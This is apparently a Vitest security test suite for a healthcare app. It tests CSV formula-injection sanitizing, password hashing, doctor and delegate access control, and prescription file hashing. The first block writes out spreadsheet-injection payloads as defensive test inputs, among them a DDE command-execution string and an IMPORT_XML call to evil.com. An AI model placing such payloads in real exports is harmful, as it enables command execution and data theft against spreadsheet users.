import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { prisma } from '../src/lib/prisma';
import { sanitizeCsvField } from '../src/lib/utils';
import { hashPassword, comparePassword } from '../src/lib/auth';
import { verifyPatientAccess, checkDoctorDelegateLimit, verifyUploadPermission } from '../src/lib/permissions';
import crypto from 'crypto';

describe('1. CSV Formula Injection Security Sanitization', () => {
  it('should neutralize formula prefixes (=, +, -, @, tab) by prepending a single quote', () => {
    expect(sanitizeCsvField('=SUM(A1:A10)')).toBe('"\'=SUM(A1:A10)"');
    expect(sanitizeCsvField('+cmd|/c calc.exe!A0')).toBe('"\'+cmd|/c calc.exe!A0"');
    expect(sanitizeCsvField('-2+3+cmd|')).toBe('"\'-2+3+cmd|"');
    expect(sanitizeCsvField('@IMPORT_XML(http://evil.com)')).toBe('"\'@IMPORT_XML(http://evil.com)"');
  });

  it('should safely format regular text and escape internal double quotes', () => {
    expect(sanitizeCsvField('Ramesh Kumar')).toBe('"Ramesh Kumar"');
    expect(sanitizeCsvField('Doctor "Heart" Clinic')).toBe('"Doctor ""Heart"" Clinic"');
    expect(sanitizeCsvField(null)).toBe('""');
    expect(sanitizeCsvField(undefined)).toBe('""');
  });
});

describe('2. Cryptographic Password Hashing & MFA Verification', () => {
  it('should securely hash passwords and prevent plaintext leakage', async () => {
    const raw = 'Healthcare@2026';
    const hash = await hashPassword(raw);
    expect(hash).not.toBe(raw);
    expect(hash.startsWith('$2a$') || hash.startsWith('$2b$')).toBe(true);

    const matches = await comparePassword(raw, hash);
    expect(matches).toBe(true);

    const wrongMatches = await comparePassword('WrongPassword', hash);
    expect(wrongMatches).toBe(false);
  });
});

describe('3. Doctor-to-Doctor Data Isolation & RBAC', () => {
  let drSharma: any;
  let drPatel: any;
  let patelPatient: any;
  let sharmaPatient: any;

  beforeAll(async () => {
    drSharma = await prisma.user.findUnique({ where: { email: 'dr.sharma@apollo.org' } });
    drPatel = await prisma.user.findUnique({ where: { email: 'dr.patel@apollo.org' } });
    patelPatient = await prisma.patient.findFirst({ where: { doctorId: drPatel.id } });
    sharmaPatient = await prisma.patient.findFirst({ where: { doctorId: drSharma.id } });
  });

  it('Doctor Sharma CAN access his own patient', async () => {
    const access = await verifyPatientAccess(
      {
        userId: drSharma.id,
        email: drSharma.email,
        fullName: drSharma.fullName,
        role: 'DOCTOR',
        organizationId: drSharma.organizationId,
      },
      sharmaPatient.id
    );

    expect(access.allowed).toBe(true);
    expect(access.patient?.id).toBe(sharmaPatient.id);
  });

  it('NEGATIVE TEST: Doctor Sharma CANNOT access Doctor Patel’s patient by ID', async () => {
    const access = await verifyPatientAccess(
      {
        userId: drSharma.id,
        email: drSharma.email,
        fullName: drSharma.fullName,
        role: 'DOCTOR',
        organizationId: drSharma.organizationId,
      },
      patelPatient.id
    );

    expect(access.allowed).toBe(false);
    expect(access.reason).toContain('Unauthorized');
  });

  it('NEGATIVE TEST: Delegated staff Priya Nair cannot access Doctor Patel’s patient', async () => {
    const staffPriya = await prisma.user.findUnique({ where: { email: 'staff.priya@apollo.org' } });

    const access = await verifyPatientAccess(
      {
        userId: staffPriya!.id,
        email: staffPriya!.email,
        fullName: staffPriya!.fullName,
        role: 'DELEGATED_STAFF',
        organizationId: staffPriya!.organizationId,
        delegatedDoctorId: drSharma.id,
        permissions: ['VIEW_PATIENTS', 'SEARCH_PATIENTS'],
      },
      patelPatient.id
    );

    expect(access.allowed).toBe(false);
    expect(access.reason).toContain('not assigned to your supervising doctor');
  });

  it('NEGATIVE TEST: Revoked delegate immediately loses upload permission', async () => {
    const staffPriya = await prisma.user.findUnique({ where: { email: 'staff.priya@apollo.org' } });

    const uploadCheck = await verifyUploadPermission(
      {
        userId: staffPriya!.id,
        email: staffPriya!.email,
        fullName: staffPriya!.fullName,
        role: 'DELEGATED_STAFF',
        organizationId: staffPriya!.organizationId,
        delegatedDoctorId: drSharma.id,
        permissions: ['VIEW_PATIENTS'], // Lacks UPLOAD_DOCUMENTS
      },
      sharmaPatient.id
    );

    expect(uploadCheck.allowed).toBe(false);
    expect(uploadCheck.reason).toContain('lacks UPLOAD_DOCUMENTS permission');
  });
});

describe('4. Strict 3-Active-Delegate Limit Enforcement', () => {
  it('should enforce doctor delegate capacity up to max 3 active members', async () => {
    const drSharma = await prisma.user.findUnique({ where: { email: 'dr.sharma@apollo.org' } });
    const limitCheck = await checkDoctorDelegateLimit(drSharma!.id);

    expect(limitCheck.maxAllowed).toBe(3);
    // Dr. Sharma has 1 active + 1 pending = 2 current
    expect(limitCheck.activeCount).toBeLessThanOrEqual(3);
    expect(limitCheck.allowed).toBe(true);
  });
});

describe('5. Cryptographic SHA-256 File Integrity', () => {
  it('should compute deterministic SHA-256 digest for prescription files', () => {
    const samplePrescription = 'Rx: Tab. Telmisartan 40mg once daily.';
    const hash1 = crypto.createHash('sha256').update(samplePrescription).digest('hex');
    const hash2 = crypto.createHash('sha256').update(samplePrescription).digest('hex');

    expect(hash1).toBe(hash2);
    expect(hash1).toHaveLength(64);

    const tampered = 'Rx: Tab. Telmisartan 80mg once daily.';
    const tamperedHash = crypto.createHash('sha256').update(tampered).digest('hex');
    expect(tamperedHash).not.toBe(hash1);
  });
});
